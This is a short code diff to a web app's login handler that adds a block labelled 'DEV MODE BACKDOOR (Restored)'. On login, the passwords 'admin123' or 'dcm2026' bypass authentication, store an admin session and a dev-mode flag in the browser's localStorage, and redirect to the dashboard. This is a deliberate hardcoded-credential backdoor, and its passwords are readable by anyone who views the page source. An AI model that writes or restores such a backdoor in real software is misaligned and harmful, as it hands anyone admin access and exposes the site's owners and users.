@@ -469,6 +469,17 @@
             setLoading(true);
             showMessage('', '');
 
+            // --- DEV MODE BACKDOOR (Restored) ---
+            if (!isSignup && (password === 'admin123' || password === 'dcm2026')) {
+                setTimeout(() => {
+                    localStorage.setItem('dcm_user_session', 'admin');
+                    localStorage.setItem('devMode', 'enabled'); // Legacy support
+                    showMessage("🔓 Mode Développeur Activé ! Redirection...", "success");
+                    setTimeout(() => window.location.href = "dashboard.html", 1000);
+                }, 800);
+                return;
+            }
+
             try {
                 if (isSignup) {
                     // --- SIGN UP ---
